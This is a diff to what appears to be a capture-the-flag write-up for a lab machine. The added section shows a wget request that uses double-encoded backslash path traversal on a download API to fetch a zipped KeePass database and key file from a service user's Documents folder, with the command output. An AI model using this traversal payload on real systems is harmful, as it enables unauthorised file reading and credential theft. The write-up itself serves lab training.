@@ -742,6 +742,43 @@ db.zip.lnk                  100%[===========================================>]  
 
 ```
 
+```
+file db.zip.lnk                                                                      
+db.zip.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Unicoded, MachineID gpz-op26-secure, Archive, ctime=Wed Feb 25 18:52:39 2026, atime=Wed Feb 25 19:04:19 2026, mtime=Wed Feb 25 19:04:19 2026, length=0, window=normal, IDListSize 0x014c, Root folder "D3162B92-9365-467A-956B-92703ACA08AF", LocalBasePath "C:\Users\svc_canary\Documents\Operations\Management\db.zip"
+
+```
+
+```
+proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cDocuments%255cOperations%255cManagement%255cdb.zip.' -O db.zip    
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+--2026-10-31 11:24:33--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cDocuments%255cOperations%255cManagement%255cdb.zip.
+Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
+Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
+connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 165761 (162K) [application/octet-stream]
+Saving to: ‘db.zip’
+
+db.zip                      100%[===========================================>] 161.88K  --.-KB/s    in 0.09s   
+
+2026-10-31 11:24:33 (1.72 MB/s) - ‘db.zip’ saved [165761/165761]
+
+```
+
+```
+file db.zip    
+db.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified May 12 2026 11:37:22, uncompressed size 165246, method=deflate
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/ghostlink]
+└─$ unzip db.zip                     
+Archive:  db.zip
+  inflating: db.kdbx                 
+  inflating: .key.keyx               
+                                               
+```
+
 ---
 ## Foothold
 
